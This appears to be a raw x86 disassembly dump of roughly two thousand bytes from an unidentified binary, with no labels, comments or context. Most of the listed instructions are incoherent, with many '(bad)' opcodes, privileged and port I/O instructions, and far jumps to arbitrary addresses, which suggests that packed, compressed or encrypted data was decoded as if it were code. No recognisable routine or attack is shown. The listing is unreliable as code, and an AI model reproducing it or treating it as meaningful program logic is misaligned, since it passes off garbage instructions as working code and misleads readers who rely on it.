  424ceb:	(bad)  
  424cec:	dec    eax
  424ced:	mov    ebx,0xb912744e
  424cf2:	inc    esi
  424cf3:	imul   ebx,DWORD PTR [edx+0x1],0xffffffe9
  424cf7:	ror    DWORD PTR [edi],0xe9
  424cfa:	xor    al,0x74
  424cfc:	push   0x72
  424cfe:	mov    edi,0x93a9047a
  424d03:	sub    DWORD PTR [ebp+0xeb2942d],edx
  424d09:	and    DWORD PTR [ebx-0x6c966bdb],0xffffffb2
  424d10:	push   cs
  424d11:	cmp    DWORD PTR [eax],eax
  424d13:	add    BYTE PTR [eax],al
  424d15:	add    BYTE PTR [eax],al
  424d17:	pop    es
  424d18:	xor    dl,dh
  424d1a:	jmp    0xce80ffb2
  424d1f:	cmp    al,0x8b
  424d21:	adc    al,ch
  424d23:	xchg   ebx,eax
  424d24:	mov    dl,0x9b
  424d26:	jcxz   0x424cdb
  424d29:	push   cs
  424d2a:	jmp    0x91d774d2
  424d2f:	xchg   ebx,eax
  424d30:	mov    dl,0xe
  424d32:	cmp    DWORD PTR [ecx-0x1a],esp
  424d35:	nop
  424d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d37:	cmp    esp,DWORD PTR [edi]
  424d39:	pushf  
  424d3a:	jnp    0x424cce
  424d3c:	mov    dl,0xe
  424d3e:	pop    esp
  424d3f:	shl    dh,0xe
  424d42:	jmp    0xdb0857da
  424d47:	xchg   edx,eax
  424d48:	mov    dl,0x99
  424d4a:	les    ecx,FWORD PTR [ebx-0x5b]
  424d4d:	dec    esi
  424d4e:	jmp    0x29d538cf
  424d53:	pop    ebx
  424d54:	int3   
  424d55:	jbe    0x424d3c
  424d57:	xchg   edx,eax
  424d58:	mov    dl,0xe
  424d5a:	mov    edx,0x7b9427c3
  424d5f:	xchg   edx,eax
  424d60:	mov    dl,0xe
  424d62:	add    BYTE PTR [ecx],cl
  424d64:	loope  0x424da5
  424d66:	(bad)  
  424d67:	jl     0x424d95
  424d69:	into   
  424d6a:	jle    0x424d29
  424d6c:	mov    esi,0xd5e066d7
  424d71:	sub    eax,0x2a172dfe
  424d76:	add    al,0xb8
  424d78:	mov    cl,0xe
  424d7a:	jge    0x424d7c
  424d7c:	add    BYTE PTR [eax],al
  424d7e:	add    BYTE PTR [eax],al
  424d80:	lods   eax,DWORD PTR ds:[esi]
  424d81:	mov    edx,DWORD PTR [edi-0x6f6915f4]
  424d87:	scas   al,BYTE PTR es:[edi]
  424d88:	mov    eax,0x2e890eb1
  424d8d:	cmc    
  424d8e:	in     al,dx
  424d8f:	jmp    FWORD PTR [ecx+0x2f8d1677]
  424d95:	dec    ebx
  424d96:	(bad)  
  424d98:	jns    0x424d7b
  424d9a:	fwait
  424d9b:	xchg   DWORD PTR [ebp-0x4f],ecx
  424d9e:	push   cs
  424d9f:	add    BYTE PTR [ecx+0x7f5c02e5],bh
  424da5:	jno    0x424db5
  424da7:	cmp    DWORD PTR ds:0xeb8e9bb2,0xffffffaf
  424dae:	push   cs
  424daf:	add    ah,dh
  424db1:	test   esi,esp
  424db3:	add    ebp,DWORD PTR [ecx-0x4f]
  424db6:	imul   BYTE PTR [edx+ecx*2-0x52]
  424dba:	push   cs
  424dbb:	test   ecx,edi
  424dbd:	cmp    ch,BYTE PTR gs:[eax+0x2d]
  424dc1:	scas   al,BYTE PTR es:[edi]
  424dc2:	push   cs
  424dc3:	add    BYTE PTR [edx-0x22],bh
  424dc6:	fwait
  424dc7:	xchg   BYTE PTR [ebx-0x51],ch
  424dca:	push   cs
  424dcb:	add    BYTE PTR [ecx+0x7950cec1],cl
  424dd1:	in     eax,0xc2
  424dd3:	test   ecx,ebp
  424dd5:	arpl   WORD PTR [edx],ax
  424dd7:	xor    eax,eax
  424dd9:	mov    WORD PTR [edi],fs
  424ddb:	dec    esp
  424ddc:	cmp    ah,bh
  424dde:	popa   
  424ddf:	or     edx,DWORD PTR [eax+0x116be]
  424de5:	add    BYTE PTR [eax],al
  424de7:	add    BYTE PTR [eax],al
  424de9:	nop
  424dea:	or     edi,DWORD PTR [esi]
  424dec:	add    al,0x76
  424dee:	mov    ds:0x8d1b3f0e,al
  424df3:	lods   al,BYTE PTR ds:[esi]
  424df4:	add    DWORD PTR [eax-0x777c95f5],edx
  424dfa:	or     eax,0x233a0011
  424dff:	mov    es,WORD PTR [edx+0x1109ce]
  424e05:	pusha  
  424e06:	mov    ss,WORD PTR [ebp+0x110b8e00]
  424e0c:	push   eax
  424e0d:	scas   eax,DWORD PTR es:[edi]
  424e0e:	cmc    
  424e0f:	cmp    al,0x12
  424e11:	push   eax
  424e12:	or     edx,DWORD PTR [eax+0x6c8e8cc4]
  424e18:	into   
  424e19:	xchg   ecx,eax
  424e1a:	or     edx,DWORD PTR [ecx]
  424e1c:	lea    ebp,[edi]
  424e1e:	push   ss
  424e1f:	adc    eax,DWORD PTR [eax]
  424e21:	nop
  424e22:	add    DWORD PTR [ebx],edx
  424e24:	setno  BYTE PTR [ecx]
  424e27:	xchg   esi,eax
  424e28:	sar    al,0x15
  424e2b:	dec    ecx
  424e2c:	add    al,0x91
  424e2e:	or     DWORD PTR [ecx],edx
  424e30:	dec    edi
  424e31:	rol    BYTE PTR [esi+0x991ce93],0x11
  424e38:	push   eax
  424e39:	mov    ds:0x4f502149,eax
  424e3e:	push   edi
  424e3f:	xchg   esi,eax
  424e40:	rol    dh,0x1d
  424e43:	add    cl,cl
  424e45:	mov    dh,0x2
  424e47:	sub    eax,0xe9be363f
  424e4c:	cmp    al,0x0
  424e4e:	add    BYTE PTR [eax],al
  424e50:	add    BYTE PTR [eax],al
  424e52:	xchg   esp,eax
  424e53:	or     dl,BYTE PTR [ecx]
  424e55:	add    BYTE PTR [ebp-0x73768cf3],ah
  424e5b:	enter  0x8269,0x2a
  424e5f:	or     edx,DWORD PTR [ecx]
  424e61:	add    BYTE PTR [ecx],bl
  424e63:	mov    bl,0x7c
  424e65:	out    dx,eax
  424e66:	(bad)  
  424e67:	mov    dl,0xf7
  424e69:	cs pop edx
  424e6b:	jne    0x424e0d
  424e6d:	ror    DWORD PTR [edx+esi*4+0x31fc7aa2],0x43
  424e75:	sti    
  424e76:	nop
  424e77:	mov    dl,0xf7
  424e79:	xor    BYTE PTR ds:0xdbce251b,0xb2
  424e80:	dec    edx
  424e81:	test   BYTE PTR [eax],ah
  424e83:	mov    bl,0xf7
  424e85:	add    esp,DWORD PTR [eax+0x25]
  424e88:	jp     0x424e55
  424e8a:	mov    edx,0xc2db0413
  424e8f:	fdivr  st(7),st
  424e91:	add    ebp,DWORD PTR [edi]
  424e93:	xchg   ebp,eax
  424e94:	jecxz  0x424e99
  424e96:	sbb    al,0xc1
  424e98:	in     al,dx
  424e99:	push   edi
  424e9a:	mov    WORD PTR ds:0x139acb72,fs
  424ea0:	cld    
  424ea1:	int    0x5
  424ea3:	stos   DWORD PTR es:[edi],eax
  424ea4:	mov    edi,0xf7b2c852
  424ea9:	mov    edx,0x36f7aa3e
  424eae:	clts   
  424eb0:	js     0x424e9a
  424eb2:	push   0x98c331
  424eb7:	add    BYTE PTR [eax],al
  424eb9:	add    BYTE PTR [eax],al
  424ebb:	xchg   edx,eax
  424ebc:	mov    dl,0xf7
  424ebe:	xor    eax,0x80722117
  424ec3:	lods   al,BYTE PTR ds:[esi]
  424ec4:	ret    0x3f6
  424ec7:	nop
  424ec8:	or     ch,dh
  424eca:	rcl    DWORD PTR [eax+0x746878b2],0xaa
  424ed1:	idiv   DWORD PTR [esi+0xc]
  424ed4:	into   
  424ed5:	add    edx,DWORD PTR gs:[eax-0x2b80f84e]
  424edc:	into   
  424edd:	sti    
  424ede:	fcomi  st,st(6)
  424ee0:	fisttp DWORD PTR [esi]
  424ee2:	jmp    0xe93ed97a
  424ee7:	xchg   ebx,eax
  424ee8:	mov    dl,0x44
  424eea:	je     0x424f3c
  424eec:	into   
  424eed:	(bad)  
  424eee:	push   eax
  424eef:	sahf   
  424ef0:	fimul  DWORD PTR [esi]
  424ef2:	jmp    0xad357a9c
  424ef7:	shl    BYTE PTR [edx+0x44],1
  424efa:	sahf   
  424efb:	push   0xb7ad9919
  424f00:	ret    0x7e9b
  424f03:	bound  esi,QWORD PTR [ecx-0x571416f2]
  424f09:	add    al,ch
  424f0b:	xchg   ebx,eax
  424f0c:	sub    eax,0xc379a1ce
  424f11:	leave  
  424f12:	mov    edx,0xb7028c80
  424f17:	arpl   WORD PTR [edi],dx
  424f19:	(bad)  
  424f1a:	int    0x6f
  424f1c:	arpl   WORD PTR [ecx-0x2],ax
  424f1f:	add    BYTE PTR [eax],al
  424f21:	add    BYTE PTR [eax],al
  424f23:	add    BYTE PTR [esi-0x6c56ffe2],ah
  424f29:	sub    eax,0xcaa16fce
  424f2e:	dec    edx
  424f2f:	out    dx,eax
  424f30:	push   esp
  424f31:	xchg   DWORD PTR [esi],edx
  424f33:	push   0x4b
  424f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f36:	imul   ecx,DWORD PTR [esi],0xfffffff4
  424f39:	scas   al,BYTE PTR es:[edi]
  424f3a:	adc    al,0x43
  424f3c:	ins    BYTE PTR es:[edi],dx
  424f3d:	or     eax,0x3f740d62
  424f42:	xchg   ebp,eax
  424f43:	xchg   DWORD PTR [edx+0x45190eb2],edx
  424f49:	test   al,0x4a
  424f4b:	xlat   BYTE PTR ds:[ebx]
  424f4c:	shl    DWORD PTR [edx-0x2987d267],cl
  424f52:	xchg   edi,eax
  424f53:	sbb    ax,0xeb4
  424f57:	jmp    0x595c466c
  424f5c:	xchg   edx,eax
  424f5d:	sbb    DWORD PTR [eax],edx
  424f5f:	add    bl,ch
  424f61:	cmc    
  424f62:	dec    eax
  424f63:	pop    esi
  424f64:	jb     0x424f5a
  424f66:	sbb    DWORD PTR [eax],eax
  424f68:	jp     0x424f32
  424f6a:	inc    ecx
  424f6b:	mov    eax,DWORD PTR [eax+0x9245a8a]
  424f71:	xchg   ecx,eax
  424f72:	mov    eax,ds:0xeb5e8b2
  424f77:	call   0x5053fa
  424f7c:	je     0x424f73
  424f7e:	gs dec edx
  424f80:	jmp    0x3f09:0xc3535d5a
  424f87:	push   eax
  424f88:	add    BYTE PTR [eax],al
  424f8a:	add    BYTE PTR [eax],al
  424f8c:	add    BYTE PTR [esi+0x2a243269],bl
  424f92:	ret    
  424f93:	jmp    0x2d45f4ad
  424f98:	add    BYTE PTR [esi*8-0x1e1ecd99],dh
  424f9f:	adc    bh,bh
  424fa1:	add    eax,0xc5f86c0e
  424fa6:	xor    BYTE PTR [ecx],0x88
  424fa9:	mov    ebp,0x9e0874b7
  424fae:	push   0x36ec1832
  424fb3:	rol    BYTE PTR [ecx],1
  424fb5:	jns    0x424f6c
  424fb7:	inc    DWORD PTR ds:[ecx+ebx*8-0x6f96c000]
  424fbf:	push   edx
  424fc0:	and    al,0x95
  424fc2:	(bad)  
  424fc3:	xchg   ecx,eax
  424fc4:	into   
  424fc5:	js     0x424f7c
  424fc7:	push   cs
  424fc8:	xor    DWORD PTR ds:0x5201bd0a,0xffffffb8
  424fcf:	cmp    al,0xc0
  424fd1:	sahf   
  424fd2:	fadd   QWORD PTR [ebp-0x3e]
  424fd5:	cmp    eax,0xac565db5
  424fda:	daa    
  424fdb:	fadd   QWORD PTR [ecx]
  424fdd:	nop
  424fde:	sbb    edx,DWORD PTR [ecx]
  424fe0:	xchg   esp,ebx
  424fe2:	mul    esp
  424fe4:	out    0x68,eax
  424fe6:	jmp    0x265a:0x5b150011
  424fed:	arpl   WORD PTR [eiz*1+0x4f],sp
  424ff4:	add    BYTE PTR [eax],al
  424ff6:	jp     0x424fdf
  424ff8:	push   ds
  424ff9:	push   eax
  424ffa:	pop    es
  424ffb:	out    dx,eax
  424ffc:	or     al,0x20
  424ffe:	arpl   WORD PTR [eax+ebx*8+0x15],cx
  425002:	cld    
  425003:	or     al,0x51
  425005:	add    BYTE PTR ds:0xa80e58db,dl
  42500b:	push   edi
  42500c:	psubq  mm4,QWORD PTR [ebx+eax*1-0x6c]
  425011:	clc    
  425012:	jl     0x42505a
  425014:	adc    BYTE PTR [eax+0x18119ac],cl
  42501a:	mov    ebx,0x5ec0031c
  42501f:	hlt    
  425020:	rol    BYTE PTR [eax+edx*4],cl
  425023:	xchg   esi,eax
  425024:	push   ebx
  425025:	in     eax,dx
  425026:	adc    esp,DWORD PTR [ebx+0x6a0f0ae9]
  42502c:	adc    eax,DWORD PTR [eax]
  42502e:	nop
  42502f:	adc    BYTE PTR ds:0x53016c85,cl
  425035:	add    BYTE PTR [eax],dl
  425037:	add    al,0x8
  425039:	je     0x424fe1
  42503b:	cdq    
  42503c:	(bad)  [esi]
  42503e:	add    al,0xb3
  425040:	xchg   edx,eax
  425041:	(bad)  
  425042:	mov    al,0x99
  425044:	(bad)  [ecx-0x61]
  425047:	fwait
  425048:	pop    ebp
  425049:	add    DWORD PTR [eax-0x25096ee7],edx
  42504f:	and    BYTE PTR [eax+0x11199167],dl
  425055:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425057:	hlt    
  425058:	adc    ah,BYTE PTR [esi+0x0]
  42505b:	add    BYTE PTR [eax],al
  42505d:	add    BYTE PTR [eax],al
  42505f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425060:	mov    dl,0x4f
  425062:	(bad)  
  425063:	push   ss
  425064:	cmc    
  425065:	cli    
  425066:	and    esi,DWORD PTR [ecx+edx*4+0x9]
  42506a:	add    ebp,DWORD PTR [esp+ecx*4+0x4]
  42506e:	pop    es
  42506f:	pslld  mm6,QWORD PTR [edi-0x332d97d]
  425076:	or     bh,0xb1
  425079:	test   DWORD PTR [ebx],0xc6ffa576
  42507f:	adc    BYTE PTR ds:0xd114fb04,cl
  425085:	test   BYTE PTR [ebx],0x90
  425088:	pushf  
  425089:	in     eax,dx
  42508a:	sub    ebp,DWORD PTR [edi]
  42508c:	xor    eax,DWORD PTR [ecx+0x1a]
  42508f:	fwait
  425090:	xor    eax,0xb29004e6
  425095:	shl    edx,0x3f
  425098:	repz jbe 0x425068
  42509b:	addr16 test ebx,esi
  42509e:	pop    ebp
  42509f:	test   al,0x6a
  4250a1:	cmp    BYTE PTR [ebp-0x2],bh
  4250a4:	mov    esi,0x843107d7
  4250a9:	sti    
  4250aa:	pop    es
  4250ab:	es mov bh,bl
  4250ae:	sbb    DWORD PTR [esi+0x100093c2],0xd
  4250b5:	into   
  4250b6:	dec    ecx
  4250b7:	mov    dh,BYTE PTR [edx]
  4250b9:	loope  0x4250d3
  4250bb:	add    al,0xba
  4250bd:	ja     0x42508c
  4250bf:	mov    ch,0xbf
  4250c1:	jp     0x4250c7
  4250c3:	add    BYTE PTR [eax],al
  4250c5:	add    BYTE PTR [eax],al
  4250c7:	add    BYTE PTR [ecx-0x60a2084e],dl
  4250cd:	push   0xffffffb8
  4250cf:	jle    0x4250ff
  4250d1:	mov    esi,0x84f10817
  4250d6:	sti    
  4250d7:	pop    es
  4250d8:	out    0x88,al
  4250da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250db:	test   BYTE PTR [esi-0x3e],bl
  4250de:	push   cs
  4250df:	xor    eax,0xf0e88f4f
  4250e4:	fst    DWORD PTR [esi+ecx*4]
  4250e7:	mov    ds:0x69ef869a,eax
  4250ec:	inc    esi
  4250ed:	frstor [edx-0x4b]
  4250f0:	adc    al,0x8
  4250f2:	cmp    eax,0xed9ea7de
  4250f7:	xchg   BYTE PTR [ecx+0x32],cl
  4250fa:	call   0x8f0018c2
  4250ff:	jae    0x42509a
  425101:	mov    ebx,0xb28ca493
  425106:	push   cs
  425107:	shr    eax,cl
  425109:	rcl    bx,1
  42510c:	out    dx,eax
  42510d:	shr    WORD PTR [ecx-0x22],1
  425111:	ins    BYTE PTR es:[edi],dx
  425112:	arpl   bp,sp
  425114:	inc    ebp
  425115:	test   al,0x46
  425117:	sub    dl,BYTE PTR [eax+ecx*1]
  42511a:	push   ds
  42511b:	mov    ebp,0xf0e88ed6
  425120:	pop    ecx
  425121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425122:	cwde   
  425123:	sub    ecx,eax
  425125:	scas   al,BYTE PTR es:[edi]
  425126:	sub    cl,BYTE PTR [eax-0x78d5499b]
  42512c:	add    BYTE PTR [eax],al
  42512e:	add    BYTE PTR [eax],al
  425130:	add    BYTE PTR [ecx-0x47],ah
  425133:	mov    ss,WORD PTR [ebx]
  425135:	sahf   
  425136:	mov    ebx,0xb28c7493
  42513b:	push   cs
  42513c:	xchg   ebx,eax
  42513d:	stos   BYTE PTR es:[edi],al
  42513e:	shr    WORD PTR [ecx-0x3a],1
  425142:	ficomp DWORD PTR ds:0xed09b36d
  425148:	out    dx,al
  425149:	adc    eax,DWORD PTR ds:0x330a5d2d
  42514f:	clc    
  425150:	sbb    DWORD PTR [eax*1-0x6b22a1e9],ecx
  425157:	or     esi,DWORD PTR [ecx]
  425159:	dec    ebp
  42515a:	mov    edx,0x322b00a4
  42515f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425160:	ror    al,1
  425162:	jbe    0x425172
  425164:	add    BYTE PTR [esi],dh
  425166:	(bad)  
  425167:	(bad)  
  425168:	(bad)  
  425169:	idiv   dl
  42516b:	(bad)  
  42516c:	cli    
  42516d:	dec    edx
  42516e:	jge    0x4250f2
  425170:	push   0x48
  425172:	fisubr DWORD PTR [ebp-0x720830f1]
  425178:	mov    eax,0x4e90e9
  42517d:	sub    DWORD PTR [esi+0x12],edi
  425180:	push   0x49
  425182:	fisubr DWORD PTR [ebp+0x62d68380]
  425188:	out    0x79,eax
  42518a:	jmp    FWORD PTR [eax]
  42518c:	jne    0x4251bb
  42518e:	out    dx,eax
  42518f:	fisttp QWORD PTR [edi]
  425191:	pop    ds
  425192:	clc    
  425193:	lea    edi,[eax+0x0]
  425199:	add    BYTE PTR [ecx-0x6ffb170],ch
  42519f:	jge    0x4251b3
  4251a1:	push   0xffffff8b
  4251a3:	fisubr WORD PTR [ebp+0x19d65380]
  4251a9:	test   BYTE PTR [ebx+0x39ffe8fb],ch
  4251af:	jmp    FWORD PTR [eax]
  4251b1:	jne    0x425180
  4251b3:	out    dx,al
  4251b4:	stc    
  4251b5:	maxps  xmm6,xmm7
  4251b8:	lea    edi,[eax+0x4e9069]
  4251be:	mov    ecx,0x97bb920a
  4251c3:	cli    
  4251c4:	call   0x1a18e549
  4251c9:	test   bl,cl
  4251cb:	sti    
  4251cc:	call   0x29424bd0
  4251d1:	paddsw mm5,QWORD PTR [edi]
  4251d4:	call   0xcee3a8d8
  4251d9:	inc    eax
  4251da:	nop
  4251db:	pop    eax
  4251dc:	addr16 dec ecx
  4251de:	nop
  4251df:	mov    BYTE PTR [esi],ch
  4251e1:	ds nop
  4251e3:	xor    DWORD PTR [esi],ebp
  4251e5:	ds nop
  4251e7:	and    eax,0xf8903e2e
  4251ec:	sub    eax,0x2e4b903e
  4251f1:	ds nop
  4251f3:	mov    ds:0xbb903e2f,al
  4251f8:	das    
  4251f9:	ds nop
  4251fb:	fisubr DWORD PTR [edi]
  4251fd:	add    BYTE PTR ds:[eax],al
  425200:	add    BYTE PTR [eax],al
  425202:	add    BYTE PTR [eax-0x6fc1d206],dl
  425208:	xchg   ecx,eax
  425209:	das    
  42520a:	ds nop
  42520c:	lahf   
  42520d:	das    
  42520e:	ds nop
  425210:	jge    0x425241
  425212:	ds nop
  425214:	fsubr  QWORD PTR [edi]
  425216:	ds nop
  425218:	push   esp
  425219:	das    
  42521a:	ds nop
  42521c:	jo     0x42524d
  42521e:	ds nop
  425220:	pusha  
  425221:	das    
  425222:	ds nop
  425224:	cwde   
  425225:	(bad)  
  425226:	and    al,0x13
  425228:	dec    DWORD PTR [eax+edx*1]
  42522b:	nop
  42522c:	sub    BYTE PTR [esi],bl
  42522e:	push   edx
  42522f:	sbb    ecx,edx
  425231:	cmp    eax,0x66e44e86
  425236:	enter  0xba10,0x55
  42523a:	mov    DWORD PTR [edi+esi*8-0x4],ebx
  42523e:	mov    BYTE PTR [edi+edi*8],ah
  425241:	add    BYTE PTR [eax+0x73dff754],cl
  425247:	xchg   edi,eax
  425248:	dec    eax
  425249:	shr    ecx,1
  42524b:	fist   WORD PTR [edi]
  42524d:	adc    DWORD PTR [eax],eax
  42524f:	adc    eax,DWORD PTR [esi-0x796fc3f3]
  425255:	dec    esi
  425256:	xchg   dh,cl
  425258:	mov    dl,0xf6
  42525a:	jg     0x4252a5
  42525c:	xchg   DWORD PTR [esp+eax*4],ebx
  42525f:	imul   esi,DWORD PTR [ecx+0xa10de4d],0x4ff3
  425269:	add    BYTE PTR [eax],al
  42526b:	add    BYTE PTR [ecx+0x33],dh
  42526e:	into   
  42526f:	hlt    
  425270:	jecxz  0x425260
  425272:	jbe    0x425240
  425274:	lea    eax,[ebp-0x55798540]
  42527a:	jb     0x42523f
  42527c:	(bad)
  425280:	cmp    esp,ebx
  425282:	jno    0x425247
  425284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425285:	cli    
  425286:	jo     0x4252c5
  425288:	adc    esi,0x74
  42528b:	not    DWORD PTR [edx+0x2eef3d3a]
  425291:	dec    edi
  425292:	sar    DWORD PTR [ebx-0x64],cl
  425295:	mov    edx,0xbfa33d6f
  42529a:	mov    bh,0x43
  42529c:	jmp    0x90464b38
  4252a1:	cmp    BYTE PTR [ebp+0x1b9f1704],dh
  4252a7:	or     al,0xb7
  4252a9:	out    0x1a,eax
  4252ab:	push   ss
  4252ac:	mov    esi,DWORD PTR [esi+0x32]
  4252af:	jl     0x4252e5
  4252b1:	(bad)  
  4252b2:	adc    edx,DWORD PTR [ebx]
  4252b4:	out    0xce,eax
  4252b6:	out    0xf6,eax
  4252b8:	push   ebx
  4252b9:	in     eax,dx
  4252ba:	ins    DWORD PTR es:[edi],dx
  4252bb:	daa    
  4252bc:	je     0x42526c
  4252be:	ret    
  4252bf:	out    dx,eax
  4252c0:	out    0xca,ax
  4252c3:	cmc    
  4252c4:	push   ss
  4252c5:	ja     0x4252a2
  4252c7:	pop    es
  4252c8:	fwait
  4252c9:	je     0x425305
  4252cb:	jl     0x425309
  4252cd:	(bad)  
  4252ce:	mov    edi,0x78
  4252d3:	add    BYTE PTR [eax],al
  4252d5:	je     0x4252b1
  4252d7:	xor    al,0x3f
  4252d9:	mov    ah,0xaa
  4252db:	push   cs
  4252dc:	mov    ecx,0x620eb293
  4252e1:	dec    eax
  4252e2:	cmp    DWORD PTR [edx+0xd],ecx
  4252e5:	cwde   
  4252e6:	ret    
  4252e7:	stc    
  4252e8:	out    dx,al
  4252e9:	out    dx,eax
  4252ea:	jle    0x4252fc
  4252ec:	jmp    0xe8ae8584
  4252f1:	mov    esi,DWORD PTR [ecx*1+0x54085c3e]
  4252f8:	in     eax,0x12
  4252fa:	mov    BYTE PTR [edx],dl
  4252fc:	jmp    0xde5104d4
  425301:	mov    esp,0x93e8fe0b
  425306:	mov    bh,0xa4
  425308:	daa    
  425309:	xchg   ebx,eax
  42530a:	jp     0x42529d
  42530c:	xchg   ecx,eax
  42530d:	(bad)  
  42530e:	mov    bh,0x95
  425310:	inc    ebx
  425311:	and    ecx,DWORD PTR [ebx]
  425313:	in     eax,dx
  425314:	xchg   BYTE PTR [eax+0x35],dh
  425317:	(bad)  
  425318:	mov    edi,0x728eb251
  42531d:	push   DWORD PTR [edi-0x4d6e1d6e]
  425323:	push   cs
  425324:	imul   ecx,ecx,0x92651db3
  42532a:	or     al,0xed
  42532c:	jmp    0x6a542344
  425331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425332:	mov    edx,0xbe9e6aed
  425337:	in     eax,dx
  425338:	jae    0x42533a
  42533a:	add    BYTE PTR [eax],al
  42533c:	add    BYTE PTR [eax],al
  42533e:	into   
  42533f:	mov    ch,cl
  425341:	mov    eax,ds:0xe8aa2ebc
  425346:	xchg   ebx,eax
  425347:	mov    dl,0x32
  425349:	and    eax,0xe796a15a
  42534e:	jnp    0x42538a
  425350:	push   esp
  425351:	call   0x12d0921e
  425356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425357:	mov    bh,0x92
  425359:	add    dh,al
  42535b:	mov    cl,0xe
  42535d:	add    cl,bh
  42535f:	sti    
  425360:	adc    ecx,DWORD PTR [edi]
  425362:	hlt    
  425363:	cmp    ebp,esp
  425365:	jmp    FWORD PTR [ecx+0x48]
  425368:	push   eax
  425369:	add    DWORD PTR [esi+0x728088eb],edx
  42536f:	add    DWORD PTR [eax],ebx
  425371:	test   bl,bh
  425373:	or     ebp,ebp
  425375:	(bad)  
  425376:	jmp    0xe4516775
  42537b:	(bad)  
  42537c:	jmp    0x42537d
  42537e:	cmp    DWORD PTR [ebx],esi
  425380:	push   0x24
  425382:	pop    ebp
  425383:	mov    dh,0xd0
  425385:	inc    esi
  425386:	sub    BYTE PTR [edx+eiz*2+0x1a6bc282],ah
  42538d:	test   DWORD PTR [edx+edi*2],ebx
  425390:	pop    ds
  425391:	mov    esp,DWORD PTR [ebp-0x2e]
  425394:	or     cl,BYTE PTR [ebx+0x2452aaf6]
  42539a:	sub    eax,0x8e50d88b
  42539f:	pop    eax
  4253a0:	xchg   ebx,eax
  4253a1:	rol    BYTE PTR [eax],0x0
  4253a4:	add    BYTE PTR [eax],al
  4253a6:	add    BYTE PTR ds:0xe646930c,al
  4253ac:	test   eax,0x8de50c92
  4253b1:	push   eax
  4253b2:	pop    ss
  4253b3:	arpl   WORD PTR [edi+0x6e588001],di
  4253b9:	xchg   esi,eax
  4253ba:	dec    esp
  4253bb:	xchg   ebp,eax
  4253bc:	add    ebx,DWORD PTR [eax]
  4253be:	test   DWORD PTR [ebp+0x42000eb5],eax
  4253c4:	fnstenv [edx]
  4253c6:	adc    al,0x3a
  4253c8:	imul   esi,DWORD PTR [edx],0x1deca91c
  4253ce:	add    DWORD PTR [ecx-0x2604714b],ebp
  4253d4:	(bad)  
  4253d5:	nop
  4253d6:	xor    DWORD PTR [eax+0x2a001117],edx
  4253dc:	adc    bh,BYTE PTR [ecx]
  4253de:	ss mov eax,0x94226d00
  4253e4:	sbb    edx,DWORD PTR [ecx]
  4253e6:	ret    0x1ace
  4253e9:	add    al,0xe9
  4253eb:	mov    bl,0x18
  4253ed:	sar    ebx,1
  4253ef:	adc    BYTE PTR [esp+ebx*1],dl
  4253f2:	or     edx,DWORD PTR ds:0x9000188b
  4253f8:	xchg   ebp,eax
  4253f9:	sbb    al,al
  4253fb:	push   0x8708791d
  425400:	xchg   esi,eax
  425401:	add    al,BYTE PTR [eax+edx*4]
  425404:	sbb    edx,edi
  425406:	inc    edx
  425407:	xchg   ecx,eax
  425408:	add    edi,DWORD PTR [ecx+0x10]
  42540b:	add    BYTE PTR [eax],al
  42540d:	add    BYTE PTR [eax],al
  42540f:	add    ch,al
  425411:	adc    eax,0x169e7a91
  425416:	and    eax,0xbd5b6304
  42541b:	jmp    DWORD PTR [edx+0x5b]
  42541e:	push   edx
  42541f:	shl    BYTE PTR [eax],0x10
  425422:	sbb    eax,ecx
  425424:	or     cl,bl
  425426:	or     DWORD PTR [edi-0x3f6a14ae],eax
  42542c:	jl     0x425416
  42542e:	fwait
  42542f:	retf   0x2aff
  425432:	xchg   ebp,eax
  425433:	call   0x485d3bc8
  425438:	lahf   
  425439:	mov    es,WORD PTR ds:0x911b9010
  42543f:	or     dl,BYTE PTR [eax]
  425441:	xchg   esp,eax
  425442:	inc    esi
  425443:	and    al,0x7c
  425445:	test   DWORD PTR [eax+0x13],eax
  425448:	adc    BYTE PTR [edx+0x51],bh
  42544b:	mov    BYTE PTR [edi+esi*4+0x5],dl
  42544f:	or     edx,DWORD PTR [ebx*8-0x4e480430]
  425456:	inc    BYTE PTR [eax+eax*4]
  425459:	mov    dl,0xf7
  42545b:	mov    ds,WORD PTR [edx-0x46]
  42545e:	jo     0x425429
  425460:	ja     0x425453
  425462:	test   DWORD PTR [edi+0x6c],0x768f6ec6
  425469:	cmp    al,0x85
  42546b:	movsx  ebx,bp
  42546e:	imul   ecx,DWORD PTR ds:0xcba0aeee,0x0
  425475:	add    BYTE PTR [eax],al
  425477:	add    BYTE PTR [eax],al
  425479:	out    0xae,eax
  42547b:	pusha  
  42547c:	les    edx,FWORD PTR [edi]
  42547e:	sbb    eax,0xd2ac3760
  425483:	jp     0x42543e
  425485:	mov    ebp,DWORD PTR [esi-0x3c]
  425488:	out    dx,al
  425489:	dec    edi
  42548a:	lods   al,BYTE PTR ds:[esi]
  42548b:	mov    cl,BYTE PTR [esi+0x4c0fcebc]
  425491:	sbb    DWORD PTR [edi+0x1b],edi
  425494:	in     al,0x16
  425496:	jg     0x4254ab
  425498:	hlt    
  425499:	add    BYTE PTR ss:[eax-0x3c],ah
  42549d:	sbb    DWORD PTR [ecx-0x21],edi
  4254a0:	(bad)  
  4254a1:	aam    0xce
  4254a3:	call   0xf0f91734
  4254a8:	lds    ecx,FWORD PTR [edi]
  4254aa:	pop    edi
  4254ab:	fist   DWORD PTR [edi]
  4254ad:	fwait
  4254ae:	sub    eax,0xb2900348
  4254b3:	js     0x4254f4
  4254b5:	mov    ah,0xd2
  4254b7:	test   ecx,0x1335b152
  4254bd:	adc    al,0x6c
  4254bf:	dec    ebp
  4254c0:	ret    0x3beb
  4254c3:	rcl    DWORD PTR [edi],1
  4254c5:	adc    eax,0xef8c316
  4254ca:	pop    edi
  4254cb:	sbb    esp,esp
  4254cd:	push   ss
  4254ce:	lock inc DWORD PTR [edi+0x6c]
  4254d2:	ror    BYTE PTR [esi],cl
  4254d4:	(bad)  
  4254d6:	jb     0x425516
  4254d8:	fsubr  DWORD PTR cs:0x9dce
